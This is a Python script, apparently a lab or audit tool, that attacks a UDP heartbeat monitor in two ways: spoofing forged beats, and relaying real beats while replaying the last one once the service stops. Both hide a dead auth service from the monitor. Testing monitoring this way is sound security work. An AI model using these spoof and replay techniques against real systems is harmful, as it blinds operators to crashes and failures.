import argparse
import json
import socket
import time

import config
from monitor import parse_beat  


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


# Attack 1: Spoof

def cmd_spoof(args):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    log(f"spoofing beats to {args.host}:{args.port} every {args.interval}s "
        f"-- make sure auth_service.py is already dead. Ctrl+C to stop. "
        f"Watch monitor.py: it should keep printing OK with no ALERT.")

    seq = 99000  
    try:
        while True:
            beat = {"svc": config.SERVICE_NAME, "seq": seq, "ts": time.time()}
            sock.sendto(json.dumps(beat).encode("utf-8"), (args.host, args.port))
            log(f"sent forged beat seq={seq}")
            seq += 1
            time.sleep(args.interval)
    except KeyboardInterrupt:
        log("spoof stopped")



# Attack 2: Relay

def cmd_relay(args):
    crash_timeout = (config.MISSED_BEATS_N - 0.5) * config.HEARTBEAT_INTERVAL_S

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((args.host, args.port))
    sock.settimeout(config.HEARTBEAT_INTERVAL_S / 4)

    log(f"relaying {args.host}:{args.port} -> monitor at "
        f"{config.HOST}:{config.MONITOR_PORT}. Point auth_service.py at "
        f"--monitor-port {args.port}. Ctrl+C to stop.")

    last_beat = None
    last_recv = None
    replaying = False
    next_replay = 0.0

    try:
        while True:
            now = time.monotonic()
            try:
                data, _ = sock.recvfrom(4096)
            except (socket.timeout, OSError):
                data = None

            if data is not None and parse_beat(data) is not None:
                last_beat, last_recv = data, now
                sock.sendto(data, (config.HOST, config.MONITOR_PORT))
                if replaying:
                    log("real beat seen back to relaying")
                    replaying = False
                else:
                    log(f"relayed real beat: {data!r}")

            if (not replaying and last_recv is not None
                    and now - last_recv > crash_timeout):
                replaying = True
                next_replay = now
                log(f"no real beat for {crash_timeout:.2f}s -- service appears "
                    f"crashed, auto-replaying last beat: {last_beat!r}")

            if replaying and now >= next_replay:
                sock.sendto(last_beat, (config.HOST, config.MONITOR_PORT))
                log(f"replayed stale beat: {last_beat!r}")
                next_replay = now + config.HEARTBEAT_INTERVAL_S
    except KeyboardInterrupt:
        log("relay stopped")


def main():
    ap = argparse.ArgumentParser(description="Adversarial audit of the heartbeat channel")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_spoof = sub.add_parser("spoof", help="Attack 1: forge beats straight to the monitor")
    p_spoof.add_argument("--host", default=config.HOST)
    p_spoof.add_argument("--port", type=int, default=config.MONITOR_PORT)
    p_spoof.add_argument("--interval", type=float, default=config.HEARTBEAT_INTERVAL_S)
    p_spoof.set_defaults(func=cmd_spoof)

    p_relay = sub.add_parser(
        "relay", help="Attack 2: relay real beats, auto-replay the last one on crash")
    p_relay.add_argument("--host", default=config.HOST)
    p_relay.add_argument("--port", type=int, default=config.RELAY_PORT)
    p_relay.set_defaults(func=cmd_relay)

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()